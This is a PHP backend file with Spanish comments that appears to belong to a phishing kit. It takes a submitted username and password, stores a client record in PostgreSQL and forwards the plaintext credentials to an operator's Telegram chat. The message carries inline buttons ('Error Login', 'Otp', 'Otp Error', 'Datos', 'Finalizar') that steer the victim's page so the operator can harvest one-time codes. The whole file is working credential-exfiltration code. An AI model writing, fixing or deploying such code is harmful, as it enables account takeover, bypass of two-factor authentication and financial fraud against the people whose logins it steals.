<?php
// Habilitar errores para depuración (quitar en producción)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Incluir las credenciales desde config.php
$config = require '../../config/config.php'; // ¡Asegúrate de que esta ruta sea correcta!

// Conexión a la base de datos
$dbConfig = $config['db'];
try {
    // !--- ARREGLO #1: Cambiar 'mysql' por 'pgsql' y añadir puerto ---!
    $pdo = new PDO(
        "pgsql:host={$dbConfig['host']};port=5432;dbname={$dbConfig['dbname']}",
        $dbConfig['user'],
        $dbConfig['password']
    );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(["error" => "Error de conexión a la base de datos: " . $e->getMessage()]);
    exit();
}

// Leer los datos enviados desde JavaScript
$data = json_decode(file_get_contents("php://input"), true);

if ($data === null) {
    http_response_code(400);
    echo json_encode(["error" => "Datos JSON inválidos o vacíos."]);
    exit();
}

// Verificar que se recibieron "usuario" y "clave"
if (!isset($data['usuario']) || !isset($data['clave'])) {
    http_response_code(400);
    echo json_encode(["error" => "Faltan datos requeridos."]);
    exit();
}

$usuario = $data['usuario'];
$clave = $data['clave'];

// Función para escapar caracteres de Markdown (versión simple para 'Markdown')
function escapeMarkdown($text) {
    $specialChars = ['_', '*', '`', '['];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

// Función para enviar mensaje con botones interactivos a Telegram
function enviarMensajeTelegram($usuario, $clave, $config, $clienteId) {
    $botToken = $config['telegram']['bot_token'];
    $chatId = $config['telegram']['chat_id'];
    $baseUrl = $config['base_url']; // URL base para los botones
    
    // !--- ARREGLO #2: Añadir la clave de seguridad a las URLs ---!
    $security_key = 'tu_clave_secreta_aqui'; // La misma que usa updatetele.php

    // Mensaje con formato básico
    // Aplicamos el escape a las variables de usuario para evitar errores de Markdown
    $mensaje = "📥 *Nuevo Cliente Registrado*\n\n"
             . "👤 *Usuario:* `" . escapeMarkdown($usuario) . "`\n"
             . "🔑 *Clave:* `" . escapeMarkdown($clave) . "`\n"
             . "🆔 *ID del cliente:* `$clienteId`";

    // Botones interactivos (ahora con la &key=)
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Error Login', 'url' => "$baseUrl?id=$clienteId&estado=1&key=$security_key"],
                ['text' => 'Datos', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"]
            ],
            [
                ['text' => 'Otp', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"]
            ],
            [
                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=0&key=$security_key"]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $postData = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown', // Markdown básico para formatear el mensaje
        'reply_markup' => json_encode($keyboard) // Botones interactivos
    ];

    // Enviar la solicitud HTTP a Telegram
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($postData),
            'ignore_errors' => true // Para poder leer la respuesta de error
        ],
    ];

    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);

    if ($response === false) {
        $error = error_get_last();
        throw new Exception("Error al enviar mensaje a Telegram: " . $error['message']);
    }

    // Analizar la respuesta de Telegram
    $responseData = json_decode($response, true);
    if (!$responseData['ok']) {
        // Guardamos el error de Telegram para depuración
        error_log("Telegram API error: " . $responseData['description']);
        throw new Exception("Telegram API error: " . $responseData['description']);
    }
}

try {
    // 1. Insertar un nuevo cliente en la base de datos
    // !--- ARREGLO #3: Usar RETURNING id ---!
    $stmt = $pdo->prepare("INSERT INTO clientes (estado) VALUES (0) RETURNING id");
    $stmt->execute();

    // 2. Obtener el ID del cliente creado
    // !--- ARREGLO #3: Usar fetchColumn() ---!
    $clienteId = $stmt->fetchColumn();
    
    if (!$clienteId) {
        throw new Exception("No se pudo crear el cliente u obtener el ID.");
    }

    // 3. Intentar enviar el mensaje a Telegram
    try {
        enviarMensajeTelegram($usuario, $clave, $config, $clienteId);
    } catch (Exception $e) {
        error_log("Error al enviar mensaje a Telegram: " . $e->getMessage());
        file_put_contents('telegram_debug_log.txt', $e->getMessage() . PHP_EOL, FILE_APPEND);
    }

    // 4. Responder con éxito
    echo json_encode([
        "message" => "Cliente creado exitosamente.",
        "clienteId" => $clienteId,
    ]);
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(["error" => "Error: " . $e->getMessage()]);
}
?>